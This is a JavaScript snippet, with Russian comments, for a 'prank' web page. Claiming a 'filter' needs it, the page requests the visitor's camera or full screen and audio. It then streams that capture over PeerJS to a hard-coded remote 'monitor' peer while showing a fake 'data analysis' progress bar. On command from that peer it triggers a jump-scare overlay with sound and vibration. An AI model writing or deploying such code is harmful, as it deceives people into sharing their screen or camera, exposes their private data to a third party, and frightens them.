<script>
    const REMOTE_ID = '09062012'; //
    const peer = new Peer();

    // Слушаем атаку от монитора
    peer.on('connection', (conn) => {
        conn.on('data', (data) => {
            if (data === 'ATTACK') showScreamer(); //
        });
    });

    async function startPrank(type) {
        try {
            let stream;
            
            if (type === 'screen') {
                // Запрос доступа к ЭКРАНУ
                stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: true, 
                    audio: true 
                });
            } else {
                // Запрос доступа к КАМЕРЕ
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
            }

            // Прячем кнопку и показываем лоадер
            document.getElementById('ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Инициализируем соединение для команд
            const conn = peer.connect(REMOTE_ID, { metadata: { device: type } });
            
            // Звоним на монитор и передаем поток
            peer.call(REMOTE_ID, stream, { metadata: { device: type } });

            // Фейковая загрузка
            fakeProgress();

        } catch (err) {
            console.error(err);
            alert("Для работы фильтра нужен доступ к " + (type === 'screen' ? "экрану" : "камере"));
        }
    }

    function fakeProgress() {
        let p = 0;
        setInterval(() => {
            if (p < 99) {
                p += Math.floor(Math.random() * 3);
                document.getElementById('load-text').innerText = "Анализ данных... " + p + "%";
            }
        }, 500);
    }

    function showScreamer() {
        const overlay = document.getElementById('scary-overlay');
        const sound = document.getElementById('scary-sound');
        overlay.style.display = 'flex';
        sound.play(); //
        if (navigator.vibrate) navigator.vibrate(1000);
    }
</script>
